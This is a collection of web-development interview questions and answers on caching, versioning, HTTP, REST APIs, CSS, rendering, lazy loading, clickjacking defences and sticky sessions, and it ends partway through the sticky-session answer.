# **Miscellaneous Interview Questions**
<br />

<h2><b><i>Question :- What is Cache Busting?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>Cache busting is the process of uploading a new file to replace an existing file that is already cached. This is useful because the cache will often take a long time to expire from all of its various locations and cache busting properly ensures that any changes to a file be visible to end users sooner, rather than later.</p>

### _1. Filename Versioning :-_
> It is the method of including the version in the file name, before the type.

``` css
    {
        background-image:url(‘back.png’);
    }

    {
        background-image:url(‘back-2.png’);
    }

    {
        background-image:url(‘back-3.png’);
    }
```
### _2. File Path Versioning :-_
> It is the process of including the version in the directory or path for the file.
``` css
    a. styles/v1/style.css 
        {
            background-image:url(‘back.png’);
        }
    b. styles/v2/style.css
        {
            background-image:url(‘back-new.png’);
        }
    c. styles/v3/style.css
        {
            background-image:url(‘back-newest.png’);
        }
```

### _3. Versioning with Query Strings :-_
<p>A Query String is a unique set of parameters that can identify separate files within the same file hierarchical path. This is usually done by adding a '?' followed by the string that indicates the differences to the end of the file. This can be used for cache busting because most cache mechanisms will use the query string as a separate file.</p>

``` css
    a. style.css
        {
            background-image:url(‘back.png’);
        }
    b. style.css?back=2
        {
            background-image:url(‘back-new.png’);
        }
    c. style.css?back=3
        {
            background-image:url(‘back-newest.png’);
        }
```
<br />

<h2><b><i>Question :- What is Semantic Versioning?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>
Semantic versioning or SemVer is the ideal way of versioning packages. They are usually written like 1.4.5 (major.minor.patch)
</p>

### _1a. Bug fix/patch version :-_
<p>
Includes bug fixes/documentation spelling mistakes etc.
</p>

### _1b. Minor version :-_
<p>
Includes additions of functions or API which does not break anything from the older versions So anything that runs on v1.1.0 should work on v1.9.0 as well.
</p>

### _1c. Major version :-_
<p>
Includes version which breaks stuff. It can include removing APIs or changing names of functions so anything that works on v1.0.0 may not necessarily work on v2.0.0
</p>

<br />

<h2><b><i>Question :- What is API Versioning?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>
API versioning is the practice of transparently managing changes to your API. Versioning is effective communication around changes to your API, so consumers know what to expect from it. You are delivering data to the public in some fashion and you need to communicate when you change the way that data is delivered.
</p>

### _Q. When to version? :-_
<p>
APIs only need to be up-versioned when a breaking change is made.
</p>

> Breaking changes include:

+ A change in the format of the response data for one or more calls
+ A change in the request or response type (i.e. changing an integer to a float)
+ Removing any part of the API.

<p>Breaking changes should always result in a change to the major version number for an API or content response type.
</p>
<p>Non-breaking changes, such as adding new endpoints or new response parameters, do not require a change to the major version number.
</p>

### _Q. How to version a REST API? :-_

+ URI Versioning
    <p>Using the URI is the most straightforward approach (and most commonly used as well) though it does violate the principle that a URI should refer to a unique resource. You are also guaranteed to break client integration when a version is updated.</p>
    
    ```
    http://api.example.com/v1
    http://apiv1.example.com
    ```
    <p>The version need not be numeric, nor specified using the “v[x]” syntax.</p>

    <p>Alternatives include dates, project names, seasons, or other identifiers that are meaningful enough to the team producing the APIs and flexible enough to change as the versions change.</p>

+ Versioning using Custom Request Header
    <p>A custom header (e.g. Accept-version) allows you to preserve your URIs between versions though it is effectively a duplicate of the content negotiation behavior implemented by the existing Accept header.</p>

    ```
    Accept-version: v1
    Accept-version: v2
    ```
+ Versioning using “Accept” header
    <p>Content negotiation may let you preserve a clean set of URLs, but you still have to deal with the complexity of serving different versions of content somewhere.</p>

    <p>This burden tends to be moved up the stack to your API controllers which become responsible for figuring out which version of a resource to send.</p>

    <p>The result tends to be a more complex API as clients have to know which headers to specify before requesting a resource.</p>

    ```
    Accept: application/vnd.example.v1+json
    Accept: application/vnd.example+json;version=1.0
    ```
    <p>In the real world, an API is never going to be completely stable. So it’s important how this change is managed.</p>

    <p>A well-documented and gradual deprecation of API can be an acceptable practice for most APIs.</p>
<br />

<h2><b><i>Question :- What is Content Negotiation?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>
Generally, the REST resources can have multiple presentations, mostly because there may be different clients expecting different representations. Asking for a suitable presentation by a client is referred to as content negotiation.</p>

<p>HTTP has provisions for several mechanisms for “content negotiation” — the process of selecting the best representation for a given response when there are multiple representations available.</p>

### _1. Server-driven Vs Agent-driven Content Negotiation :-_
<p>
If the selection of the best representation for a response is made by an algorithm located at the server, it is called server-driven negotiation. If that selection is made at the agent or client-side, it is called agent-driven negotiation.</p>

<p>Practically, we will NOT find much usage of server-side negotiations because, in that way, we have to make a lot of assumptions about the client’s expectations.</p>

<p>Few things, like the client context or how the client will use the resource representation, are almost impossible to determine. Also, the server-driven negotiation makes the server-side code more complex, unnecessarily.</p>

<p>So, most REST API implementations rely on agent-driven content negotiations. Agent-driven content negotiation depends on the usage of HTTP request headers or resource URI patterns.</p>

### _1a. Using HTTP Headers :-_
<p>At server side, an incoming request may have an entity attached to it. To determine it’s type, server uses the HTTP request header Content-Type. Some common examples of content types are “text/plain”, “application/xml”, “text/html”, “application/json”, “image/gif”, and “image/jpeg”.</p>

```
Content-Type: application/json
```
<p>Similarly, to determine what type of representation is desired on the client-side, an HTTP header ACCEPT is used. It will have one of the values mentioned for Content-Type above.</p>

```
Accept: application/json
```
<p>Generally, if no Accept header is present in the request, the server can send pre-configured default representation type.</p>

> Implementing Accept header based content negotiation is most used and recommened way.

### _1b. Using URL Patterns :-_
<p>Another way to pass content type information to the server, the client may use the specific extension in resource URIs. For example, a client can ask for details using:</p>

```
http://rest.api.com/v1/employees/20423.xml
http://rest.api.com/v1/employees/20423.json
```
<p>In the above case, the first request URI will return an XML response whether the second request URI will return a JSON response.</p>

### _2. Defining Preferences :-_
<p>It is possible to have multiple values in Accept header using the ‘q’ parameter i.e. relative quality factor.</p>

<p>The client may want to provide multiple values in the accept header when the client is not sure if its desired representation is present or supported by the server at that time. [RFC 2296]

For example,</p>

```
Accept: application/json,application/xml;q=0.9,*/*;q=0.8
```
<p>Above Accept header allows you to ask the server a JSON format (first choice). If it can’t, perhaps it could return XML format (the second choice). If it’s still not possible, let it return what it can.</p>

<p>The preference order is defined through the q parameter with values from 0 to 1. When nothing is specified, the implicit default value is 1.</p>
<br />

<h2><b><i>Question :- What is REST API Compression?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>
REST APIs can return the resource representations in several formats such as XML, JSON, HTML, or even plain text. All such forms can be compressed to a lesser number of bytes to save bandwidth over the network.

Different protocols use different techniques to enable compression and notify the clients about the compression scheme – so that the client can decompress it before consuming the representations.
</p>

> Compression, like encryption, is something that happens to the resource representation in transit and must be undone before the client can use the representation.

<p>
HTTP is the most widely used protocol for REST – so we are taking the example of HTTP-specific response compression.
</p>

### _1. Compression Related Request/Response Headers :-_

### _1a. Accept-Encoding :-_
<p>While requesting resource representations – along with an HTTP request, the client sends an Accept-Encoding header that says what kind of compression algorithms the client understands.

The two standard values for Accept-Encoding are compress and gzip.

A sample request with accept-encoding, the header looks like this :</p>

``` http
GET        /employees         HTTP/1.1
Host:     www.domain.com
Accept:     text/html
Accept-Encoding:     gzip,compress
```

<p>Another possible usage of accept-encoding may be:</p>

``` http
Accept-Encoding: compress, gzip
Accept-Encoding:
Accept-Encoding: *
Accept-Encoding: compress;q=0.5, gzip;q=1.0
Accept-Encoding: gzip;q=1.0, identity; q=0.5, *;q=0
```

<p>If an Accept-Encoding the field is present in a request, and if the server cannot send a response that is acceptable according to the Accept-Encoding header, then the server SHOULD send an error response with the 406 (Not Acceptable) status code.</p>

### _1b. Content-Encoding :-_
<p>If the server understands one of the compression algorithms from Accept-Encoding, it can use that algorithm to compress the representation before serving it. When successfully compressed, the server lets know the client of encoding scheme by another HTTP header i.e. Content-Encoding.
</p>

``` http
200 OK
Content-Type:     text/html
Content-Encoding:     gzip
```

<p>If the content-coding of an entity in a request message is not acceptable to the origin server, the server SHOULD respond with a status code of 415 (Unsupported Media Type). If multiple content encodings have been applied to an entity, all the encodings MUST be listed in the order in which they were used.</p>

<p>Please note that the original media type for request and response are not impacted whether compression is requested or not.</p>

<p>Compression can save a lot of bandwidth, with minimal cost without additional complexity. Also, you may know that most web browsers automatically request compressed representations from website host servers – using the above headers.</p>
<br />

<h2><b><i>Question :- Difference between HTTP/2 vs. HTTP/1.1?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1a. What is HTTP? Why is HTTP/2 faster than HTTP/1.1?`_
<p>HTTP stands for hypertext transfer protocol, and it is the basis for almost all web applications. More specifically, HTTP is the method computers and servers use to request and send information. For instance, when someone navigates to cloudflare.com on their laptop, their web browser sends an HTTP request to the Cloudflare servers for the content that appears on the page. Then, Cloudflare servers send HTTP responses with the text, images, and formatting that the browser displays to the user.</p>

<p>The first usable version of HTTP was created in 1997. Because it went through several stages of development, this first version of HTTP was called HTTP/1.1. This version is still in use on the web. In 2015, a new version of HTTP called HTTP/2 was created.</p>

<p>HTTP/2 solves several problems that the creators of HTTP/1.1 did not anticipate. In particular, HTTP/2 is much faster and more efficient than HTTP/1.1. One of the ways in which HTTP/2 is faster is in how it prioritizes content during the loading process.</p>

### _1a. What is prioritization?`_
<p>
In the context of web performance, prioritization refers to the order in which pieces of content are loaded. Suppose a user visits a news website and navigates to an article. Should the photo at the top of the article load first? Should the text of the article load first? Should the banner ads load first?</p>

<p>Prioritization affects a webpage's load time. For example, certain resources, like large JavaScript files, may block the rest of the page from loading if they have to load first. More of the page can load at once if these render-blocking resources load last.</p>

<p>In addition, the order in which these page resources load affects how the user perceives page load time. If only behind-the-scenes content (like a CSS file) or content the user can't see immediately (like banner ads at the bottom of the page) loads first, the user will think the page is not loading at all. If the content that's most important to the user loads first, such as the image at the top of the page, then the user will perceive the page as loading faster.</p>

### _1a. How does prioritization in HTTP/2 affect performance?`_
<p>In HTTP/2, developers have hands-on, detailed control over prioritization. This allows them to maximize perceived and actual page load speed to a degree that was not possible in HTTP/1.1.</p>

<p>HTTP/2 offers a feature called weighted prioritization. This allows developers to decide which page resources will load first, every time. In HTTP/2, when a client makes a request for a webpage, the server sends several streams of data to the client at once, instead of sending one thing after another. This method of data delivery is known as multiplexing. Developers can assign each of these data streams a different weighted value, and the value tells the client which data stream to render first.</p>

<p>Imagine that Alice wants to read a novel that her friend Bob wrote, but both Alice and Bob only communicate through the regular mail. Alice sends a letter to Bob and asks Bob to send her his novel. Bob decides to send the novel HTTP/1.1-style: He mails one chapter at a time, and he only mails the next chapter after receiving a reply letter from Alice confirming that she received the previous chapter. Using this method of content delivery, it takes Alice many weeks to read Bob's novel.</p>

<p>Now imagine that Bob decides to send Alice his novel HTTP/2-style: In this case, he sends each chapter of the novel separately (to stay within the postal service's size limits) but all at the same time. He also numbers each chapter: Chapter 1, Chapter 2, etc. Now, Alice receives the novel all at once and can assemble it in the correct order on her own time. If a chapter is missing, she may send a quick reply asking for that specific chapter, but otherwise the process is complete, and Alice can read the novel in just a few days.</p>

<p>In HTTP/2, data is sent all at once, much like Bob when he sends Alice multiple chapters at once. And just like Bob, developers get to number the chapters in HTTP/2. They can decide if the text of a webpage loads first, or the CSS files, or the JavaScript, or whatever they feel is most important for the user experience.</p>

### _1a. What are the other differences between HTTP/2 and HTTP/1.1 that impact performance?`_
+ Multiplexing
    <p>HTTP/1.1 loads resources one after the other, so if one resource cannot be loaded, it blocks all the other resources behind it. In contrast, HTTP/2 is able to use a single TCP connection to send multiple streams of data at once so that no one resource blocks any other resource. HTTP/2 does this by splitting data into binary-code messages and numbering these messages so that the client knows which stream each binary message belongs to.</p>

+ Server push
    <p>Typically, a server only serves content to a client device if the client asks for it. However, this approach is not always practical for modern webpages, which often involve several dozen separate resources that the client must request. HTTP/2 solves this problem by allowing a server to "push" content to a client before the client asks for it. The server also sends a message letting the client know what pushed content to expect – like if Bob had sent Alice a Table of Contents of his novel before sending the whole thing.</p>

+ Header compression
    <p>Small files load more quickly than large ones. To speed up web performance, both HTTP/1.1 and HTTP/2 compress HTTP messages to make them smaller. However, HTTP/2 uses a more advanced compression method called HPACK that eliminates redundant information in HTTP header packets. This eliminates a few bytes from every HTTP packet. Given the volume of HTTP packets involved in loading even a single webpage, those bytes add up quickly, resulting in faster loading.</p>

### _1a. What is HTTP/3?`_
<p>HTTP/3 is the next proposed version of the HTTP protocol. HTTP/3 does not have wide adoption on the web yet, but it is growing in usage. The key difference between HTTP/3 and previous versions of the protocol is that HTTP/3 runs over QUIC instead of TCP. QUIC is a faster and more secure transport layer protocol that is designed for the needs of the modern Internet.</p>
<br />

<h2><b><i>Question :- What is Tree Shaking in Webpack and how does it works?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>
Tree shaking is a term commonly used in the JavaScript context for dead-code elimination. It relies on the static structure of ES2015 module syntax, i.e. import and export. The name and concept have been popularized by the ES2015 module bundler rollup.</p>

### _1a. Clarifying tree shaking and sideEffects :-_
<p>The sideEffects and usedExports (more known as tree shaking) optimizations are two different things.</p>

<p>sideEffects is much more effective since it allows to skip whole modules/files and the complete subtree.</p>

<p>usedExports relies on terser to detect side effects in statements. It is a difficult task in JavaScript and not as effective as straightforward sideEffects flag. It also can't skip subtree/dependencies since the spec says that side effects need to be evaluated. While exporting function works fine, React's Higher Order Components (HOC) are problematic in this regard.</p>
<br />

<h2><b><i>Question :- What is the Box Model?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>All HTML elements can be considered as boxes.</p>

### _The CSS Box Model :-_
<p>In CSS, the term "box model" is used when talking about design and layout.</p>

<p>The CSS box model is essentially a box that wraps around every HTML element. It consists of: margins, borders, padding, and the actual content. The image below illustrates the box model:</p>

### _Explanation of the different parts :-_

+ Content - The content of the box, where text and images appear

+ Padding - Clears an area around the content. The padding is transparent

+ Border - A border that goes around the padding and content

+ Margin - Clears an area outside the border. The margin is transparent

<p>The box model allows us to add a border around elements, and to define space between elements. 
</p>

### _Demonstration of the box model :-_
``` css
div {
  width: 300px;
  border: 15px solid green;
  padding: 50px;
  margin: 20px;
}
```
<br />

<h2><b><i>Question :- What are the different properties of position attribute in css?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>
<p>There are five different position values:</p>

+ static
+ relative
+ fixed
+ absolute
+ sticky
<br />

<h2><b><i>Question :- What is Server Side Rendering? What are the uses of it?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Server-side rendering refers to an application’s ability to display the web-page on the server rather than rendering it in the browser. When a website’s JavaScript is rendered on the website’s server, a fully rendered page is sent to the client and the client’s JavaScript bundle engages and enables the Single Page Application framework to operate.</p>

<p>Server-side rendering (SSR) is an application’s ability to convert HTML files on the server into a fully rendered HTML page for the client. The web browser submits a request for information from the server, which instantly responds by sending a fully rendered page to the client. Search engines can crawl and index content prior to delivery, which is beneficial for Search Engine Optimization purposes.</p>

<p>Popular examples of server-side rendering JavaScript frameworks include: Angular server side rendering, ejs server side rendering, server side rendering Express, Gatsby server side rendering, Google server side rendering, NestJS server side rendering, Next server side rendering, Nuxt server side rendering, React server side rendering, and Vue server side rendering.</p>

### _Question. What are the Benefits of Server-Side Rendering?`_
<p>Some server-side rendering advantages include:</p>

+ A server-side rendered application enables pages to load faster, improving the user experience.

+ When rendering server-side, search engines can easily index and crawl content because the content can be rendered before the page is loaded, which is ideal for SEO. 

+ Webpages are correctly indexed because web browsers prioritize web pages with faster load times.

+ Rendering server-side helps efficiently load webpages for users with slow internet connection or outdated devices.

### _Question. What are the Risks of Server-Side Rendering?`_

<p>Server-side rendering disadvantages may include:</p>

+ Rendering server-side can be costly and resource-intensive as it is not the default for JavaScript websites, and the server takes on the full burden of rendering content for users and bots.

+ While rendering static HTML server-side is efficient, rendering bigger, more complex applications server-side can increase load times due to the bottleneck.

+ Server-side rendering may not be compatible with third-party JavaScript code. 

+ Rendering server-side may be ideal for static site generation, but frequent server requests and full page reloads can result in overall slower page rendering in more complex applications.</p>

### _Question. Server-Side Rendering vs Client-Side Rendering?`_
<p>
In client-server rendering, rather than receiving all of the content from the HTML document, content is rendered in the browser using the client-side JavaScript library. The browser does not make a new request to the server when a new page is loaded. Search engine rankings may be negatively impacted as the content is not rendered until the page is loaded on the browser, however, website rendering tends to be faster in client-side rendered app. In considering server side vs client side rendering, the developer will assess factors such as the scale of the project, the complexity of the application, the number of users, and user experience priorities.</p>
<br />

<h2><b><i>Question :- What is Statelessness in REST APIs?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. Statelessness`_
<p>As per the REST (REpresentational “State” Transfer) architecture, the server does not store any state about the client session on the server-side. This restriction is called Statelessness.</p>

<p>Each request from the client to the server must contain all of the necessary information to understand the request. The server cannot take advantage of any stored context on the server.</p>

<p>The application’s session state is therefore kept entirely on the client. The client is responsible for storing and handling the session related information on its own side.</p>

<p>This also means that the client is responsible for sending any state information to the server whenever it is needed. There should not be any session affinity or sticky session between the client and the server.</p>

> Statelessness means that every HTTP request happens in complete isolation. When the client makes an HTTP request, it includes all information necessary for the server to fulfill the request.

> The server never relies on information from previous requests from the client. If any such information is important then the client will send that as part of the current request.

<p>
To enable clients to access these stateless APIs, it is necessary that servers also should include every piece of information that the client may need to create/maintain the state on its side.</p>

<p>For becoming stateless, do not store even authentication/authorization details of the client. Provide authentication credentials with each request.</p>

<p>Thus each request MUST be stand alone and should not be affected by the previous conversation that happened with the same client in past.</p>

### _2. Application State vs Resource State`_
<p>It is important to understand the between the application state and the resource state. Both are completely different things.</p>

<p>Application state is server-side data that servers store to identify incoming client requests, their previous interaction details, and current context information.</p>

<p>Resource state is the current state of a resource on a server at any point in time – and it has nothing to do with the interaction between client and server. It is what we get as a response from the server as the API response. We refer to it as resource representation.</p>

> REST statelessness means being free from the application state.

### _3. Advantages of Stateless APIs`_
<p>There are some very noticeable advantages of having REST APIs stateless.</p>

+ Statelessness helps in scaling the APIs to millions of concurrent users by deploying it to multiple servers. Any server can handle any request because there is no session related dependency.

+ Being stateless makes REST APIs less complex – by removing all server-side state synchronization logic.

+ A stateless API is also easy to cache as well. Specific softwares can decide whether or not to cache the result of an HTTP request just by looking at that one request. There’s no nagging uncertainty that state from a previous request might affect the cacheability of this one. It improves the performance of applications.

+ The server never loses track of “where” each client is in the application because the client sends all necessary information with each request.
<br />

<h2><b><i>Question :- REST API Security Essentials?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>REST API Security isn’t an afterthought. It has to be an integral part of any development project and also for REST APIs.</p>

<p>There are multiple ways to secure a RESTful API e.g. basic auth, OAuth, etc. but one thing is sure that RESTful APIs should be stateless – so request authentication/authorization should not depend on sessions.</p>

<p>Instead, each API request should come with some sort of authentication credentials that must be validated on the server for every request.</p>

### _1. REST Security Design Principles`_

+ <strong>Least Privilege - </strong>
    <p>An entity should only have the required set of permissions to perform the actions for which they are authorized, and no more. Permissions can be added as needed and should be revoked when no longer in use.</p>
+ <strong>Fail-Safe Defaults - </strong>
    <p>A user’s default access level to any resource in the system should be “denied” unless they’ve been granted a “permit” explicitly.</p>
+ <strong>The economy of Mechanism - </strong>
    <p>The design should be as simple as possible. All the component interfaces and the interactions between them should be simple enough to understand.</p>
+ <strong>Complete Mediation - </strong>
    <p>A system should validate access rights to all its resources to ensure that they’re allowed and should not rely on the cached permission matrix. If the access level to a given resource is being revoked, but that isn’t reflected in the permission matrix, it would violate the security.</p>
+ <strong>Open Design - </strong>
    <p>This principle highlights the importance of building a system in an open manner—with no secret, confidential algorithms.</p>
+ <strong>Separation of Privilege - </strong>
    <p>Granting permissions to an entity should not be purely based on a single condition, a combination of conditions based on the type of resource is a better idea.</p>
+ <strong>Least Common Mechanism - </strong>
    <p>It concerns the risk of sharing state among different components. If one can corrupt the shared state, it can then corrupt all the other components that depend on it.</p>
+ <strong>Psychological Acceptability - </strong>
    <p>It states that security mechanisms should not make the resource more difficult to access than if the security mechanisms were not present. In short, security should not make worse the user experience.</p>

### _2. Best Practices to Secure REST APIs`_

+ <strong>Keep it Simple - </strong>
<p>Secure an API/System – just how secure it needs to be. Every time you make the solution more complex “unnecessarily,” you are also likely to leave a hole.</p>

+ <strong>Always Use HTTPS - </strong>
<p>By always using SSL, the authentication credentials can be simplified to a randomly generated access token. The token is delivered in the username field of HTTP Basic Auth. It’s relatively simple to use, and you get a lot of security features for free.</p>

<p>If you use HTTP 2, to improve performance – you can even send multiple requests over a single connection, that way you avoid the complete TCP and SSL handshake overhead on later requests.</p>

+ <strong>Use Password Hash - </strong>
<p>Passwords must always be hashed to protect the system (or minimize the damage) even if it is compromised in some hacking attempts. There are many such hashing algorithms that can prove really effective for password security e.g. PBKDF2, bcrypt, and scrypt algorithms.</p>

+ <strong>Never expose information on URLs - </strong>
<p>Usernames, passwords, session tokens, and API keys should not appear in the URL, as this can be captured in web server logs, which makes them easily exploitable.</p>

```
https://api.domain.com/user-management/users/{id}/someAction?apiKey=abcd123456789  //Very BAD !!
```
<p>The above URL exposes the API key. So, never use this form of security.</p>

+ <strong>Consider OAuth - </strong>
<p>Though basic auth is good enough for most of the APIs and if implemented correctly, it’s secure as well – yet you may want to consider OAuth as well.</p>

<p>The OAuth 2.0 authorization framework enables a third-party application to obtain limited access to an HTTP service, either on behalf of a resource owner by orchestrating an approval interaction between the resource owner and the HTTP service, or by allowing the third-party application to obtain access on its behalf.</p>

+ <strong>Consider Adding Timestamp in Request</strong>
<p>Along with other request parameters, you may add a request timestamp as an HTTP custom header in API requests.</p>

<p>The server will compare the current timestamp to the request timestamp and only accepts the request if it is after a reasonable timeframe (30 seconds, perhaps).</p>

<p>This will prevent very basic replay attacks from people who are trying to brute force your system without changing this timestamp.</p>

+ <strong>Input Parameter Validation -</strong>
<p>Validate request parameters on the very first step, before it reaches application logic. Put strong validation checks and reject the request immediately if validation fails.</p>

<p>In API response, send relevant error messages and examples of correct input format to improve user experience.</p>
<br />

<h2><b><i>Question :- What is Lazy & Eager Loading?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. What is Lazy Loading?`_
<p>Lazy loading is the practice of delaying load or initialization of resources or objects until they’re actually needed to improve performance and save system resources. For example, if a web page has an image that the user has to scroll down to see, you can display a placeholder and lazy load the full image only when the user arrives to its location.</p>

> The benefits of lazy loading include:
#### _a. Reduces initial load time –_
<p>Lazy loading a webpage reduces page weight, allowing for a quicker page load time.</p>

#### _b. Bandwidth conservation –_
<p>Lazy loading conserves bandwidth by delivering content to users only if it’s requested.</p>

#### _c. System resource conservation –_
<p>Lazy loading conserves both server and client resources, because only some of the images, JavaScript and other code actually needs to be rendered or executed.</p>

### _2. Lazy Loading vs. Eager Loading`_
<p>While lazy loading delays the initialization of a resource, eager loading initializes or loads a resource as soon as the code is executed. Eager loading also involves pre-loading related entities referenced by a resource. For example, a PHP script with an include statement performs eager loading—as soon as it executes, eager loading pulls in and loads the included resources.</p>

<p>Eager loading is beneficial when there is an opportunity or need to load resources in the background. For example, some websites display a “loading” screen and eagerly load all the resources required for the web application to run.</p>

### _3. Lazy Loading Implementing Methods`_
<p>There are several open source libraries that can be used to implement lazy loading, including:</p>

+ #### _blazy.js –_
<p>blazy.js is a lightweight JavaScript library for lazy loading and multi-serving images, iframes, video and other resources.</p>

+ #### _LazyLoad –_
<p>LazyLoad is a script that automatically loads images as they enter the viewport.</p>

> <strong>Methods for implementing lazy loading in your code include:</strong>

+ #### _a. Lazy initialization –_
<p>This method sets objects to null. Object data is loaded only after and whenever invoking them, check if null, and if so, load object data.</p>

+ #### _b. Virtual proxy –_
<p>When accessing an object, call a virtual object with same interface as the real object. When the virtual object is called, load the real object, then delegate to it.</p>

+ #### _c. Ghost –_
<p>Load an object in partial state, only using an identifier. The first time a property on the object is called, load the full data.</p>

+ #### _d. Value holder –_
<p>Create a generic object that handles lazy loading behavior. This object should appear in place of an object’s data fields.</p>

> <strong>Examples - </strong>
#### _a. Lazy Loading Images –_
<p>To lazy load an image, display a lightweight placeholder image, and replace with the real full-size image on scroll.</p>

+ Inline <img> tags, using JavaScript to populate the tag if image is in viewport

+ Event handlers such as scroll or resize

+ The Intersection Observer API

+ The CSS background-image property

#### _b. Lazy Loading Video –_
<p>To lazy load a video that doesn’t autoplay, you can use the HTML5 video tag’s preload attribute.</p>

<p>For videos that autoplay, Google Chrome provides lazy loading automatically. In other browsers, you will need to declare the following attributes in the video tag:</p>

``` html
<video autoplay muted loop playsinline width="xx" height="xx" poster="placeholder-image.jpg">
``` 

### _3. Lazy Loading Best Practices -_
<p>When performing lazy loading, consider the following tips:</p>

+ Only lazy load resources that are displayed below the fold or outside the user’s viewport. In code, only lazy load objects that are not needed for initial or essential system operations.

+ When lazy loading an image, asynchronously decode it using the JavaScript decode() method before inserting it into the DOM. Otherwise, large images can cause the browser to freeze.

+ Handle errors in case the image or object fails to load.

+ Offer a noscript in case JavaScript is not available. Otherwise users with JavaScript disabled will not see any lazy-loaded resources.</p>

<br />

<h2><b><i>Question :- What is clickjacking?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.</p>

<p>Typically, clickjacking is performed by displaying an invisible page or HTML element, inside an iframe, on top of the page the user sees. The user believes they are clicking the visible page but in fact they are clicking an invisible element in the additional page transposed on top of it.</p>

<p>The invisible page could be a malicious page, or a legitimate page the user did not intend to visit – for example, a page on the user’s banking site that authorizes the transfer of money.</p>

> There are several variations of the clickjacking attack, such as:
+ #### _1. Likejacking -_
<p>A technique in which the Facebook “Like” button is manipulated, causing users to “like” a page they actually did not intend to like.</p>

+ #### _2. Cursorjacking -_
<p>A UI redressing technique that changes the cursor for the position the user perceives to another position. Cursorjacking relies on vulnerabilities in Flash and the Firefox browser, which have now been fixed.</p>

+ ### _2. Clickjacking attack example -_
<p>The attacker creates an attractive page which promises to give the user a free trip to Tahiti.</p>

<p>In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form.</p>

<p>The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user.</p>

<p>The user visits the page and clicks the “Book My Free Trip” button.</p>

<p>In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker.</p>

<p>The user is redirected to a page with information about the free gift (not knowing what happened in the background).</p>

### _3. Clickjacking mitigation -_
<p>There are two general ways to defend against clickjacking:</p>

+ #### _a. Client-side methods -_
<p>the most common is called Frame Busting. Client-side methods can be effective in some cases, but are considered not to be a best practice, because they can be easily bypassed.</p>

+ #### _b. Server-side methods -_
<p>The most common is X-Frame-Options. Server-side methods are recommended by security experts as an effective way to defend against clickjacking.</p>

> <strong>Mitigating clickjacking with X-Frame-Options response header</strong>

<p>The X-Frame-Options response header is passed as part of the HTTP response of a web page, indicating whether or not a browser should be allowed to render a page inside a < FRAME > or < IFRAME > tag.</p>

+ #### _a. There are three values allowed for the X-Frame-Options header: -_

    - DENY – does not allow any domain to display this page within a frame

    - SAMEORIGIN – allows the current page to be displayed in a frame on another page, but only within the current domain

    - ALLOW - FROM URI – allows the current page to be displayed in a frame, but only in a specific URI – for example www.example.com/frame-page

+ #### _b. Using the SAMEORIGIN option to defend against clickjacking -_
<p>X-Frame-Options allows content publishers to prevent their own content from being used in an invisible frame by attackers.</p>

<p>The DENY option is the most secure, preventing any use of the current page in a frame. More commonly, SAMEORIGIN is used, as it does enable the use of frames, but limits them to the current domain.</p>

+ #### _c. Limitations of X-Frame-Options -_
<p>To enable the SAMEORIGIN option across a website, the X-Frame-Options header needs to be returned as part of the HTTP response for each individual page (cannot be applied cross-site).</p>

<p>X-Frame-Options does not support a whitelist of allowed domains, so it doesn’t work with multi-domain sites that need to display framed content between them.</p>

<p>Only one option can be used on a single page, so, for example, it is not possible for the same page to be displayed as a frame both on the current website and an external site.</p>

<p>The ALLOW-FROM option is not supported by all browsers.</p>

<p>X-Frame-Options is a deprecated option in most browsers.</p>
```

+ #### _d. Clickjacking test – Is your site vulnerable? -_
<p>A basic way to test if your site is vulnerable to clickjacking is to create an HTML page and attempt to include a sensitive page from your website in an iframe. It is important to execute the test code on another web server, because this is the typical behavior in a clickjacking attack.</p>

<p>Use code like the following, provided as part of the OWASP Testing Guide:</p>

``` html
<html>
    <head>
        <title>Clickjack test page</title>
    </head>
    <body>
        <p>Website is vulnerable to clickjacking!</p>
        <iframe src="http://www.yoursite.com/sensitive-page" width="500" height="500"></iframe>
    </body>
</html>
```

<p>View the HTML page in a browser and evaluate the page as follows:</p>

<p>If the text “Website is vulnerable to clickjacking” appears and below it you see the content of your sensitive page, the page is vulnerable to clickjacking.</p>

<p>If only the text “Website is vulnerable to clickjacking” appears, and you do not see the content of your sensitive page, the page is not vulnerable to the simplest form of clickjacking.</p>

<p>However, additional testing is needed to see which anti-clickjacking methods are used on the page, and whether they can be bypassed by attackers.</p>

<h2><b><i>Question :- What is a sticky session?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Session stickiness, a.k.a., session persistence, is a process in which a load balancer creates an affinity between a client and a specific network server for the duration of a session, (i.e., the time a specific IP spends on a website). Using sticky sessions can help improve user experience and optimize network resource usage.</p>

<p>With sticky sessions, a load balancer assigns an identifying attribute to a user, typically by issuing a cookie or by tracking their IP details. Then, according to the tracking ID, a load balancer can start routing all of the requests of this user to a specific server for the duration of the session.</p>

<p>This can prove very helpful, as HTTP/S is a stateless protocol that was not devised with session persistence in mind. Nevertheless, many web applications do have the need to serve personalized user data (e.g., keep logs of items in a shopping cart or chat conversations) over the course of a session.</p>

<p>Without session persistence, the web application would have to maintain this information across multiple servers, which can prove inefficient—especially for large networks.</p>

### _1. Session stickiness: Advantages and disadvantages_
<p>Session stickiness offers a number of benefits that can improve your web application’s performance, including:</p>

+ #### _a. Minimized data exchange_
<p>When using sticky sessions, servers within your network don’t need to exchange session data, a costly process when done on scale.</p>

